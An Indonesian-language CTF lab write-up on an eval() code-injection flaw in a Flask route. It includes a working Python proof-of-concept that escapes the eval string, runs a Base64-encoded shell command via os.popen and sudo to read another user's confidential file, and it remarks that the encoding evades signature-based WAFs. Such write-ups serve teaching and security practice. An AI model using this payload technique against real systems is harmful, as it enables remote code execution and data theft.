---
title: Rahasia Sahroni
description: Writeup lab Rahasia Sahroni
tags:
  - input injection
  - code injection
  - python
  - CTF
draft: false
---

## Summary
* Vuln Name: `eval()` Injection (Code Injection)
* Type: Input Injection
* Impact: Remote Code Execution (RCE)
* Severity: Critical
* functionality: [[input-validation]]

## Metodologi dan Observasi
1. Lab ini pada dasarnya memiliki arsitektur kerentanan yang nyaris identik dengan lab [[rahasia-ganjar]]. Pada aplikasi web berbasis Python Flask ini, _routing_ url mengijinkan injeksi melalui parameter jalur (_path_).
2. Tinjauan terhadap `app.py` menyingkap bahwa rute _flask_ mengevaluasi sembarang isian pengguna secara harafiah di dalam fungsion `eval()`:
   ```python
   @app.route('/<path:user_input>')
   def index(user_input):
       try:
           result = eval(f'"{user_input}"')
           return render_template('index.html', result=result)
   ```
3. Kelalaian dalam membidas atau menghapus karakter penutup _string_ (seperti absennya [[input-validation]]) memuluskan teknik [[code-injection]]. Peretas dapat dengan mudah mengakali pemroses untuk beralih mode dari yang sekadar mengevaluasi teks menjadi mesin pengeksekusi kode.
4. Apa yang berbeda dari skenario ini adalah tantangan yang sering muncul dalam konstruksi muatan injeksi di lapangan, yakni kutipan bertingkat (_nested quotes_). Oleh karena penyisipan (_payload_) harus berjejalan dalam batas _path_ URL dan tidak boleh mematahkan format _string eval_, penyerang sering kali membungkus komando berbahaya menjadi susunan Base64 yang akan didekode secara langsung oleh _shell_.

## PoC
Skrip pembuktian di bawah ini menggunakan pengkodean Base64 untuk meloloskan utilitas bahasa Python dalam mengakses program rahasia milik _user_ `sahroni`:

```python
import requests
import base64
import urllib.parse

url = "http://localhost:1337"

# 1. Mendefinisikan perintah mentah untuk privesc ke sahroni
raw_cmd = "sudo -u sahroni /usr/local/bin/python3 -c \"print(open('/home/sahroni/confidential.txt').read())\""

# 2. Kita enkoding string ke Base64 untuk menghindari insiden salah kutip
b64_cmd = base64.b64encode(raw_cmd.encode()).decode()

# 3. Merangkai pembungkus bash yang akan menerima hasil decode
shell_wrapper = f"(echo {b64_cmd} | base64 -d | sh) 2>&1"

# 4. Membuat escape string untuk injeksi eval python
injection = f'"+__import__("os").popen("{shell_wrapper}").read()+"'

# 5. Mengemas muatan sebagai URL Path dan mengirimkannya
payload = urllib.parse.quote(injection)
res = requests.get(f"{url}/{payload}")

if "pwn{" in res.text:
    print(f"[+] Flag retrieved!")
```

## Impact
Kombinasi eksploitasi eval Python dan eksekusi instruksi pembungkus Base64 mempertegas bahaya [[remote-code-execution]]. Karena muatan dikodekan, injeksi peretas bahkan berpeluang menghindar (*bypassing*) dari jaring pendeteksi tanda tangan *malware* berbasis kata statis yang lazim dipasang oleh [[web-application-firewall]].
